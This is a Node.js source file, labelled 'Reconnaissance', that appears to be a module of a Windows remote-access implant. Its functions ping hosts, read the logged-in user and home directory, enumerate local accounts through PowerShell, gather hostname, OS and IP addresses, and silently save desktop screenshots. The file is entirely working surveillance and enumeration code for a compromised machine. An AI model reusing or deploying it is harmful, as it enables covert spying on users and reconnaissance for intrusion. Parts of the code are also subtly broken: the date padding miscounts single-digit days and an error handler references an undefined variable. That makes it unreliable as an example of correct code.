// Reconnaissance
const os = require('os');
const fs = require('fs')
const screenshot = require('screenshot-desktop');
const { spawn } = require('child_process');


// Ping an ipv4 address. Only 2 packets are sent.
function ping(ip){
  return new Promise((resolve, reject) => {
    const proc = spawn('ping.exe', [ip, '-n', '2']);
    let newArray = [];

    proc.stdout.on('data', (data) => {
      newArray.push(`${data}`);
    });
    
    proc.stderr.on('data', (data) => {
      console.error(`stderr: ${data}`);
    });
    
    proc.on('close', (code) => {
      const final = newArray.join('');
      console.log(`child process exited with code ${code}`);
      resolve(final);
    });

    console.log("Process created. PID: " + proc.pid);
  });
}


// Whoami
function whoami(){
  return new Promise((resolve, reject) => {
    const username = os.userInfo().username;
    const homedir = os.userInfo().homedir;
    resolve([username, homedir]);
  });
}


// Get Local users
function users(info){
  return new Promise((resolve, reject) => {
    const proc = spawn('powershell.exe', ['-c', 'get-localuser | select name']);
    let newArray = [];

    proc.stdout.on('data', (data) => {
      newArray.push(`${data}`);
    });
    
    proc.stderr.on('data', (data) => {
      console.error(`stderr: ${data}`);
    });
    
    proc.on('close', (code) => {
      const final = newArray.join('');
      //console.log(final);
      //console.log(`child process exited with code ${code}`);
      resolve(final);
    });
  });
}


//get local system information
function systeminfo(){
  return new Promise((resolve, reject) => {
    const hostname = os.hostname();
    const platform = os.platform();
    const type = os.type();
    const release = os.release();
    const ifaces = os.networkInterfaces();

    //grab network interfaces and ip addresses
    let netArr = [];
    Object.keys(ifaces).forEach(function (ifname) {
      var alias = 0;
    
      ifaces[ifname].forEach(function (iface) {
        if ('IPv4' !== iface.family || iface.internal !== false) {
          // skip over internal (i.e. 127.0.0.1) and non-ipv4 addresses
          return;
        }
        if (alias >= 1) {
          // this single interface has multiple ipv4 addresses
          netArr.push(ifname + ": " + alias, iface.address);

        } else {
          // this interface has only one ipv4 adress
          netArr.push(ifname + ": " + iface.address);
        }
        ++alias;
      });
    });
    resolve([hostname, platform, type, release, netArr]);
  });
}


//screencap. only captures main screen. To update to another module.
function doScreenshot(){
  return new Promise((resolve, reject) => {
    getDateTime().then((dateString) => {
      const ssPath = ".\\ss\\" + "screenshot-" + dateString + ".png";

      screenshot()
      .then((img) => {
        fs.writeFile(ssPath, img, function (err) {
          if (!err) {
            resolve(["Screenshot captured.", ssPath]);
          } else {
            reject(["Screenshot failed.", error]);
          }
        });
      });
    });
  });
}

function doScreenshot2(){
  return new Promise((resolve, reject) => { 
    getDateTime().then((dateString) => {

      screenshot.all()
      .then((imgs) => {
        // imgs: an array of Buffers, one for each screen
        for(i=0; i<imgs.length; i++){
          let outputs = [];
          var ssPath = ".\\ss\\" + "screen" + i + "-" + dateString + ".png";
          fs.writeFile(".\\ss\\" + "screen" + i + "-" + dateString + ".png", imgs[i], (err) => {
            if (err) {
              throw err
            } else {
              console.log("Written to " + ssPath + ".")
              outputs.push(ssPath)
              resolve(outputs);
            }
          });
        }
        //resolve(imgs.length + " screenshots captured.", outputs);
      })
      .catch((err) => {
        throw err
      });      
   });
  });
}



//calculate current date and time and format accordingly.
function getDateTime(){
  return new Promise((resolve, reject) => {
    const d = new Date();
    const yyyy = d.getFullYear().toString();
    var mm = (d.getMonth() + 1)
    if (mm < 10){
      var mm = "0" + (d.getMonth() + 1).toString();
    }
    var dd = d.getDate().toString();
    if (dd < 10){
      var dd = "0" + (d.getDate() + 1).toString();
    }
    var hh = d.getHours().toString();
    if (hh < 10){
      var hh = "0" + d.getHours().toString();
    }
    var mn = d.getMinutes().toString();
    if (mn < 10){
      var mn = "0" + d.getMinutes().toString();
    }
    var ss = d.getSeconds().toString();
    if (ss < 10){
      var ss = "0" + d.getSeconds().toString();
    }
    const dateString = yyyy + mm + dd + hh + mn + ss;
    resolve(dateString);
  });
}

module.exports = {
  ping,
  whoami,
  users,
  systeminfo,
  doScreenshot
};